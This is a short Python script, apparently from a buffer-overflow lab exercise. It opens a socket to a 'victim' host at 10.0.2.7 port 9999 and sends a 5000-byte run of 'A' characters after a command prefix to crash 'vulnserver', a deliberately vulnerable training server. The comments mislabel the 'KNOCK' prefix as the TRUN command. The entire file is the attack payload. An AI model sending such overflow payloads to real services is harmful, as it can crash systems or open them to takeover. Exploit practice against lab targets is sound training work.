# This module "socket" provides access to the BSD socket interface
import socket
# This module "struct" performs conversions between Python values
# and C structs represented as Python bytes objects.
import struct

HOST = '10.0.2.7'   # vitcim IP
PORT = 9999         # victim port

# Payload to inject into vulnserver
PAYLOAD = (
    b'KNOCK /.:/' +  # TRUN command of the server
    b'A' * 5000
)

# the with statement can process exceptions
# when dealing with resources like file and close resources properly
# fd=socket.create_connection((HOST, PORT))
with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
